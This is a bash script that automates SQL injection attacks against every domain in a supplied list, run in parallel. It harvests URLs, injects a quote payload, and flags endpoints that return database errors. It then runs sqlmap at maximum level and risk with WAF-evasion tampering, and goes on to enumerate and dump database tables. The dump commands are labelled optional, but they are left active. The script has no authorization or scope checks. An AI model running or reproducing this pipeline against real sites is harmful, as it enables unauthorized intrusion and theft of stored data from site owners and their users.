#!/bin/bash

# Function to handle each domain
scan_domain() {
  TARGET=$1
  BASE_DOMAIN=$2
  TARGET_NAME=$(echo "$TARGET" | sed 's|https\?://||' | cut -d '/' -f 1)
  OUTPUT_DIR="/mnt/sqli/${BASE_DOMAIN}/${TARGET_NAME}_output"

  mkdir -p "$OUTPUT_DIR"
  echo "[+] Created output directory: $OUTPUT_DIR"
  echo "[+] Target: $TARGET"

  # Step 1: SQLi Discovery
  echo "[+] Step 1: Discovering SQL Injection Points..."
  echo "$TARGET" | gau | uro | grep "\?" | sed "s/=.*/=A'/" | uniq > "${OUTPUT_DIR}/params.txt"
  cat "${OUTPUT_DIR}/params.txt" | httpx -mc 200 -mr ".*SQL.*|.*syntax.*|.*error.*|.*database.*|.*ODBC.*|.*mysqli.*|.*MySQL.*|.*pgSQL.*" -silent > "${OUTPUT_DIR}/potential_vulns.txt"

  if [ ! -s "${OUTPUT_DIR}/potential_vulns.txt" ]; then
    echo "[-] No potential vulnerable endpoints found for $TARGET."
    return
  fi

  echo "[+] Potential vulnerable endpoints found for $TARGET:"
  cat "${OUTPUT_DIR}/potential_vulns.txt"

  # Step 2: Manual analysis
  while read -r endpoint; do
    echo "[+] Testing endpoint: $endpoint"
    curl -s "$endpoint" | grep -i "SQL syntax"
    if [ $? -eq 0 ]; then
      echo "[+] Confirmed SQL Injection vulnerability at: $endpoint"
      VULN_ENDPOINT=$endpoint
      break
    fi
  done < "${OUTPUT_DIR}/potential_vulns.txt"

  if [ -z "$VULN_ENDPOINT" ]; then
    echo "[-] No confirmed SQL Injection vulnerability on $TARGET."
    return
  fi

  # Step 3: SQLMap exploitation
  PARAM=$(echo "$VULN_ENDPOINT" | grep -oP "(?<=\?).*(?==)")
  DBMS="MSSQL"

  sqlmap -u "$VULN_ENDPOINT" -p "$PARAM" --dbms="$DBMS" --level 5 --risk 3 --banner --batch --random-agent --tamper=space2comment --output-dir="$OUTPUT_DIR"

  # Optional steps: You can uncomment these if full automation is needed
   sqlmap -u "$VULN_ENDPOINT" -p "$PARAM" --dbs --output-dir="$OUTPUT_DIR"
   sqlmap -u "$VULN_ENDPOINT" -p "$PARAM" -D target_db --tables --output-dir="$OUTPUT_DIR"
   sqlmap -u "$VULN_ENDPOINT" -p "$PARAM" -D target_db -T target_table --dump --output-dir="$OUTPUT_DIR"

  echo "[+] Completed scan for $TARGET."
}

# Main execution block
if [ -z "$1" ]; then
  echo "Usage: $0 <domain>"
  exit 1
fi

DOMAIN=$1
# Use OUTPUT_DIR environment variable if set, otherwise fallback to /mnt
OUTPUT_DIR="${OUTPUT_DIR:-/mnt/${DOMAIN}}"
DOMAIN_FILE="${OUTPUT_DIR}/domains_${DOMAIN}.txt"

if [ ! -f "$DOMAIN_FILE" ]; then
  echo "[-] Domain list file not found: $DOMAIN_FILE"
  exit 1
fi

echo "[+] Reading domain list from $DOMAIN_FILE..."

# Loop over domains and run in parallel
BASE_DOMAIN="${OUTPUT_DIR}/sqli_output"
mkdir -p "$BASE_DOMAIN"
while read -r line; do
  [ -z "$line" ] && continue
  scan_domain "$line" "$DOMAIN" &
done < "$DOMAIN_FILE"

wait
echo "[+] All scans completed."
